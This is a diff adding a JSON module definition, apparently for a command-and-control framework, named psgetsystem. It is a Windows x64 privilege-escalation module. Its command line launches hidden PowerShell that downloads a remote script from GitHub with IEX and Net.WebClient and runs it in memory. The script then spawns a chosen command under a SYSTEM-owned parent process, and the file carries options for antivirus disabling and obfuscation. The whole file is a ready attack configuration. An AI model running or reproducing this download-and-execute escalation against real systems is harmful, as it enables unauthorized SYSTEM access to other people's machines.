@@ -1,0 +1,35 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "psgetsystem",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["decoder (@decoder_it)"],
+    "path": ["windows", "x64", "powershell", "privesc", "psgetsystem.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "privilege": false,
+    "notes": "Use powershell Get-Process -IncludeUserName|Where {$_.UserName -eq \"NT AUTHORITY\\SYSTEM\"} to retrieve a list of processes running as SYSTEM. Blog: https://decoder.cloud/2018/02/02/getting-system/",
+    "remote": "https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1",
+    "local": ["data", "src", "decoder-it", "psgetsystem", "psgetsys.ps1"],
+    "options": [
+      {"name": "systemPID", "value": "", "required": true, "flag": "", "description":"The PID of the process with SYSTEM privileges to spawn a child process from"},
+      {"name": "CMD", "value": "cmd.exe", "required": true, "flag": "", "description":"The command to run as SYSTEM"}
+    ],
+    "description": "Simple powershell/C# to spawn a process under a different parent process;getsystem via parent process using ps1 and embeded c#",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w",
+      "0",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1');",
+      "[MyProcess]::CreateProcessFromParent({{systemPID.Value}},'{{CMD.Value}}')",
+      "\""
+    ]
+  },
+  "powershell": {
+    "disableav": false,
+    "obfuscate": false,
+    "base64": false
+  }
+}
